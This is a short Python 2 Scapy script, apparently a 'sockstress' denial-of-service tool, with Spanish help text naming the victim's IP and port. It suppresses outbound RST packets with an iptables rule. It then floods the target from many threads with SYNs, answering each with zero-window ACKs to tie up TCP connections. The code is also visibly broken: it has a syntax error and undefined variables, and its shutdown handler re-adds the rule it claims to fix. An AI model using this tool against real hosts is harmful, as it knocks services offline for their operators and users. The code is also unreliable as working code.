from scapy.all import *
from time import sleep

import logging
import argparse
import sys
import thread
import random

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def sockstress(target, port):
 for p range (int(args.CONECT)):
  x = random.randint(0,65535)
  response = sr1(IP(dst=target)/TCP(sport=x,dport=port,flags='S'),timeout=1,verbose=0) 
  send(IP(dst=target)/TCP(dport=port,sport=x,window=0,flags='A',ack=(response[TCP].seq + 1))/'\x00\x00',verbose=0)



## Graceful shutdown allows IP Table Repair
def graceful_shutdown(signal, frame):
 print '\nYou pressed Ctrl+C!'
 print 'Fixing IP Tables'
 os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')
 sys.exit()


if __name__ == "__main__":
 ## Creates IPTables Rule to Prevent Outbound RST Packet to Allow Scapy TCP Connections
 os.system('iptables -A OUTPUT -p tcp --tcp-flags RST RST -d ' + target + ' -j DROP')

 ## Spin up multiple threads to launch the attack
 parser = argparse.ArgumentParser(description="Script para hacer Dos con FLOOD SYN")
 parser.add_argument('-V', '--IP_USER',metavar="IPUSER", help="IP de la victima", required=True, dest='USER')
 parser.add_argument('-P', '--PORT',metavar="IPPORT", help="PUERTO de la victima", required=True, dest='PORT')
 parser.add_argument('-C', '--CONECTIONS',metavar="NUMCONECT", help="Numero de conexiones", required=True, dest='CONECT')
 parser.add_argument('-t', '--threads', metavar="THreads", help="Numero de hilos", required=True,dest='TH')

 args = parser.parse_args()
 
 for x in range(0,threads):
  thread.start_new_thread(sockstress, (args.USER,args.PORT))

 signal.signal(signal.SIGINT, graceful_shutdown)

